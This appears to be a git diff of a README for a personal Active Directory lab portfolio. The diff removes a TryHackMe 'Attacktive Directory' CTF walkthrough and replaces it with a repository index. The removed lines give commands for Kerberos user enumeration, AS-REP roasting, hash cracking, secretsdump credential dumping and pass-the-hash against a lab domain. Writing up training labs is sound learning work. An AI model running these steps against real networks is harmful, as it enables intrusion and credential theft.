@@ -1,195 +1,83 @@
-# 🛡️ Attacktive Directory Write-up
+# 🔐 Active Directory Labs
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge">
-  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge">
-  <img src="https://img.shields.io/badge/Category-Active%20Directory-blue?style=for-the-badge">
-</p>
+> A collection of hands-on Active Directory labs, covering enumeration, exploitation, and privilege escalation techniques.
 
 ---
 
-## 📌 Overview
+## 🚀 About This Repository
 
-* **Room:** Attacktive Directory
-* **Domain:** spookysec.local
-* **Objective:** Compromise the domain and retrieve all flags
+This repository documents my journey through Active Directory labs, focusing on real-world attack techniques used in penetration testing and red teaming.
 
-This lab demonstrates a full Active Directory attack chain, leveraging Kerberos misconfigurations, credential exposure, and privilege escalation techniques to achieve Domain Admin access.
-
----
-
-## 📑 Table of Contents
-
-* [🌐 Initial Enumeration](#-initial-enumeration)
-* [🧑‍💻 User Enumeration](#-user-enumeration)
-* [🔐 AS-REP Roasting](#-as-rep-roasting)
-* [🔓 Hash Cracking](#-hash-cracking)
-* [📂 SMB Enumeration](#-smb-enumeration)
-* [🔐 Credential Extraction](#-credential-extraction)
-* [🧠 Privilege Escalation](#-privilege-escalation)
-* [🔑 Pass-the-Hash](#-pass-the-hash)
-* [🏁 Flags](#-flags)
-* [📚 Key Takeaways](#-key-takeaways)
+Each lab includes:
+- Step-by-step methodology  
+- Commands used  
+- Screenshots for clarity  
+- Key takeaways  
 
 ---
 
-## 🌐 Initial Enumeration
+## 📂 Labs Covered
 
-```bash
-nmap -sC -sV -p- <target-ip>
-```
+### 🛡️ Attacktive Directory
+- Full Active Directory attack chain  
+- Kerberos abuse (AS-REP Roasting)  
+- Credential extraction & privilege escalation  
+- Pass-the-Hash to Domain Admin  
 
-### 🔍 Findings:
-
-* 88 → Kerberos
-* 389 → LDAP
-* 445 → SMB
-* 139 → NetBIOS
-* 3389 → RDP
-
-✔️ Confirmed Active Directory Domain Controller
-
-📸 ![Nmap](screenshots/nmap.png)
+👉 [View Write-up](./Attacktive-Directory)
 
 ---
 
-## 🧑‍💻 User Enumeration
+### 🔍 AD Basic Enumeration
+- Network discovery  
+- SMB enumeration  
+- LDAP & RPC user enumeration  
+- Kerberos username validation  
+- Password spraying  
 
-```bash
-kerbrute userenum --dc <target-ip> -d spookysec.local userlist.txt
-```
-
-### 🔍 Result:
-
-* Valid domain users discovered
-
-📸 ![Kerbrute](screenshots/kerbrute.png)
+👉 [View Write-up](./AD-Basic-Enumeration)
 
 ---
 
-## 🔐 AS-REP Roasting
+## 🧠 Skills Demonstrated
 
-```bash
-impacket-GetNPUsers spookysec.local/ -usersfile user.txt -no-pass -dc-ip <target-ip>
-```
-
-### 🎯 Result:
-
-* Retrieved AS-REP hash
-
-📸 ![ASREP](screenshots/asrep.png)
+- Active Directory Enumeration  
+- SMB & LDAP Analysis  
+- Kerberos Attacks  
+- Password Spraying  
+- Privilege Escalation  
+- Credential Dumping  
 
 ---
 
-## 🔓 Hash Cracking
+## 🛠️ Tools Used
 
-```bash
-hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
-```
-
-### 🎯 Result:
-
-* Password recovered
-
-📸 ![Hashcat](screenshots/hashcat.png)
-
----
-
-## 📂 SMB Enumeration
-
-```bash
-smbclient -L //<target-ip>/ -U <username>
-```
-
-### 🔍 Shares Found:
-
-* ADMIN$
-* backup
-* IPC$
-* NETLOGON
-* SYSVOL
-
-📸 ![SMB](screenshots/smb.png)
+- Nmap  
+- SMBClient / SMBMap  
+- Enum4linux-ng  
+- RPCClient  
+- Kerbrute  
+- CrackMapExec  
+- Impacket  
+- Hashcat  
 
 ---
 
-## 🔐 Credential Extraction
+## 🎯 Goal
 
-```bash
-echo "<encoded_string>" | base64 -d
-```
-
-### 🎯 Result:
-
-* Found credentials for backup user
-
-📸 ![Decode](screenshots/decode.png)
+The goal of this repository is to:
+- Build a strong foundation in Active Directory security  
+- Document practical attack techniques  
+- Create a public cybersecurity portfolio  
 
 ---
 
-## 🧠 Privilege Escalation
+## 📌 Author
 
-```bash
-impacket-secretsdump spookysec.local/backup:<password>@<target-ip>
-```
-
-### 🎯 Result:
-
-* Dumped NTLM hashes:
-
-  * Administrator
-  * svc-admin
-  * backup
-
-📸 ![Secretsdump](screenshots/secretsdump.png)
+- 💻 GitHub: https://github.com/cybe07  
 
 ---
 
-## 🔑 Pass-the-Hash
+## ⭐ If you find this useful
 
-```bash
-evil-winrm -i <target-ip> -u Administrator -H <NTLM-hash>
-```
-
-### 🎯 Result:
-
-* Domain Admin access achieved
-
----
-
-## 🏁 Flags
-
-| User          | Location |
-| ------------- | -------- |
-| Administrator | Desktop  |
-| svc-admin     | Desktop  |
-| backup        | Desktop  |
-
-⚠️ Flags hidden for ethical reasons
-
----
-
-## 🔥 Attack Chain
-
-```
-Nmap → Kerbrute → AS-REP → Hashcat → SMB → Decode → Secretsdump → PtH → DA
-```
-
----
-
-## 📚 Key Takeaways
-
-* Kerberos misconfigurations can lead to credential exposure
-* AS-REP roasting enables offline password attacks
-* Base64 encoding is not secure
-* Backup privileges can expose the entire domain
-* Pass-the-Hash avoids the need to crack passwords
-
----
-
-## 🚀 Author
-
-* 💻 cybe07
-* 🔗 https://github.com/cybe07
-
----
+Give the repo a ⭐ and follow for more cybersecurity content 🚀
